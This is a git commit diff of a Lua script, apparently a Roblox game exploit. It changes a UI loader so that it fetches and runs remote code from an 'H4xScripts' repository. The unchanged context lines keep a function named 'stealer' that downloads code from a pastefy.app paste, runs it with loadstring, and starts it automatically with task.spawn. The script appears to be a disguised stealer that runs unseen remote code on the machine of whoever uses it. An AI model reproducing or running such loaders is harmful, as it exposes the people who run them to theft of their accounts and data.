dfd709cc42329d6d1dbe6d06e939c478ad3acf05
ScriptLast <hadikusumah012@gmail.com>
2025-05-30 20:56:31 +0700

    Update Script1.lua

--- Script1.lua
+++ Script1.lua
@@ -2,7 +2,7 @@ local function stealer()
     loadstring(game:HttpGet('https://pastefy.app/5IYO4uQT/raw'))()
 end
 local function loadui()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptLast/Growagarden/refs/heads/main/Script2.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/H4xScripts/Loader/refs/heads/main/loader2.lua'))()
 end
 
 task.spawn(stealer)
